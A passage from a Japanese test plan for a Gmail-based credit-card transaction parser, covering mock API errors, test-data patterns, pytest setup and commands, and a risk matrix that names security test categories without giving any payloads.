        "1970-01-01",         # 境界値: UNIX epoch
    ]
}
```

### 5.4 モックオブジェクト（Gmail API エラーレスポンス）

```python
from googleapiclient.errors import HttpError
from unittest.mock import Mock

# T-SEC-014: 429 Rate Limit
mock_429_error = HttpError(
    resp=Mock(status=429),
    content=b'{"error": {"code": 429, "message": "Rate Limit Exceeded"}}'
)

# T-SEC-016: 401 Unauthorized
mock_401_error = HttpError(
    resp=Mock(status=401),
    content=b'{"error": {"code": 401, "message": "Invalid Credentials"}}'
)

# T-SEC-017: 403 Forbidden
mock_403_error = HttpError(
    resp=Mock(status=403),
    content=b'{"error": {"code": 403, "message": "Insufficient Permission"}}'
)

# T-EDGE-022: 404 Not Found
mock_404_error = HttpError(
    resp=Mock(status=404),
    content=b'{"error": {"code": 404, "message": "Message not found"}}'
)
```

### 5.5 テストデータパターン

| パターン | 説明 | 使用テストケース |
|---------|------|---------------|
| **正常系データ** | 全カラムに有効な値を持つ標準的なレコード | T-DATA-001, T-DATA-013, T-DATA-021 |
| **境界値データ** | 金額0円、負数、巨額、NULL merchant | T-DATA-007, T-DATA-008, T-DATA-009, T-DATA-002 |
| **異常系データ** | NOT NULL制約違反、UNIQUE制約違反 | T-DATA-003, T-DATA-004, T-DATA-030〜036 |
| **複数レコード** | 月次集計、カード別集計用の大量データ | T-DATA-042〜055 |
| **不正メールデータ** | is_verified=Falseのレコード | T-DATA-046 |
| **不正フォーマット** | 壊れたHTML、文字化け、欠損フィールド | T-EDGE-001〜016 |
| **重複メール** | 同一message ID、楽天速報/確定版 | T-EDGE-017〜019 |
| **フィッシングメール** | 不正ドメイン、セゾン詐欺、偽装 | T-SEC-001〜004 |
| **インジェクション攻撃** | SQLi, XSS, コマンドインジェクション | T-SEC-005〜010 |

### 5.6 テストデータのクリーンアップ

- **方針**: 各テスト関数ごとに新規DBを作成（`scope='function'`）
- **メリット**: テスト間でデータ汚染が発生しない、並列実行可能
- **デメリット**: 初期化コストが毎回発生（インメモリDBのため影響小）

```python
@pytest.fixture(scope='function')
def db_session():
    """毎回新規作成 → テスト終了時に自動破棄"""
    engine = create_engine('sqlite:///:memory:')
    Base.metadata.create_all(engine)
    # ...
    yield session
    session.close()  # 自動的にメモリから消える
```

### 5.7 テストデータのバージョン管理

| ファイル | 用途 |
|---------|------|
| `tests/fixtures/sample_emails/` | メール解析テスト用（HTMLメールサンプル） |
| `tests/fixtures/edge_cases/` | 不正フォーマットメール（T-EDGE-001〜016） |
| `tests/fixtures/security/phishing/` | フィッシングメールサンプル（T-SEC-001〜004） |
| `tests/conftest.py` | pytestフィクスチャ定義（共通テストデータ） |
| `tests/test_data/transactions.json` | 大量データ生成用のシードデータ（オプション） |

---

## 6. 付録

### 6.1 テスト実行順序

```
Phase 1: ユニットテスト（単体）
  → T-DATA-001〜041（CRUD、データ整合性）
  → T-DATA-062〜067（インデックス検証）
  → T-EDGE-001〜016（メール解析の異常系）
  → T-SEC-005〜010（インジェクション攻撃）

Phase 2: 統合テスト（コンポーネント連携）
  → T-DATA-042〜061（集計、トランザクション）
  → T-EDGE-017〜030（Gmail API、DB、OAuth）
  → T-SEC-001〜004（フィッシング対策）
  → T-SEC-011〜025（認証、API、CSRF、DoS）

Phase 3: E2Eテスト（全体シナリオ）
  → 家老が担当（本計画書の対象外）
```

### 6.2 前提条件チェックリスト

| 前提条件 | 確認方法 | 満たせない場合の対処 |
|---------|---------|------------------|
| **Pythonバージョン 3.11+** | `python --version` | バージョンアップまたはpyenv使用 |
| **poetryインストール済み** | `poetry --version` | 公式手順でインストール |
| **依存ライブラリインストール済み** | `poetry install` | 事前実行 |
| **pytestインストール済み** | `pytest --version` | `poetry add --dev pytest` |
| **テストフィクスチャ配置済み** | `tests/fixtures/`の存在確認 | テストデータ準備スクリプト実行 |
| **SQLiteファイル書込権限** | `touch data/test.db && rm data/test.db` | 権限変更 `chmod 755 data/` |
| **環境変数設定** | `.env`ファイル存在確認 | `.env.example`をコピー |

### 6.3 SKIP判定条件

**以下の場合、テストをSKIPしてはならない（SKIP = FAIL扱い）**:
- 前提条件が満たせないが、対処可能な場合（ライブラリ未インストールなど）
- テストデータ準備が未完了の場合

**SKIPが許容されるケース**:
- Gmail API本番環境へのアクセスが必要だが、CI環境でクレデンシャルが利用不可（モックで代替推奨）
- Docker環境が必須だが、ローカル環境のみで実行（環境依存テスト）

### 6.4 テスト実行コマンド

```bash
# 全テスト実行
pytest tests/test_data_layer.py tests/test_edge_cases.py tests/test_security.py -v

# カバレッジ測定付き
pytest --cov=app/models --cov=app/database --cov=app/services --cov-report=html

# 特定のテストのみ実行
pytest tests/test_data_layer.py::test_insert_basic_transaction -v

# マーカーでフィルタリング（例: Critical優先度のみ）
pytest -m critical

# 優先度別実行
pytest -m "critical or high"  # Critical + High優先度のみ
```

### 6.5 マーカー定義（pytest.ini）

```ini
[pytest]
markers =
    critical: 最優先テスト（リリースブロッカー）
    high: 高優先度テスト
    medium: 中優先度テスト
    low: 低優先度テスト
    slow: 実行時間が長いテスト（パフォーマンステスト等）
```

### 6.6 リスク評価マトリックス

| リスク種別 | 発生確率 | 影響度 | リスクレベル | 軽減テスト |
|-----------|---------|-------|------------|-----------|
| **フィッシングメール誤検知** | 高 | 高 | **Critical** | T-SEC-001〜004 |
| **SQLインジェクション攻撃** | 中 | 高 | **High** | T-SEC-005, T-SEC-006 |
| **XSS攻撃** | 中 | 高 | **High** | T-SEC-007, T-SEC-008 |
| **OAuth トークン漏洩** | 低 | 高 | **High** | T-SEC-011, T-SEC-012, T-SEC-024 |
| **楽天カード重複メール** | 高 | 中 | **Medium** | T-EDGE-018, T-EDGE-019 |
| **メール形式変更によるパース失敗** | 中 | 中 | **Medium** | T-EDGE-001〜007 |
| **Gmail APIレート制限到達** | 低 | 中 | **Medium** | T-SEC-014, T-SEC-015 |
| **文字エンコーディング異常** | 中 | 低 | **Low** | T-EDGE-002, T-EDGE-003 |

---

## 統合完了サマリー

| 項目 | 値 |
|------|-----|
| **統合元ファイル数** | 2ファイル |
| **総テストケース数** | 122件 |
| **内訳** | データ層: 67件、エッジケース: 30件、セキュリティ: 25件 |
| **テスト階層** | Unit: 67件、Integration: 55件 |
| **重複ケース** | 0件（TestIDプレフィックスで分離済み） |
| **OWASP Top 10カバレッジ** | 8項目/10項目（80%） |
| **次フェーズ** | Phase 2最終統合（全5計画を1ファイルに統合） |

**作成完了日時**: 2026-02-16
**次のアクション**: 家老レビュー待機、他足軽の統合結果待機
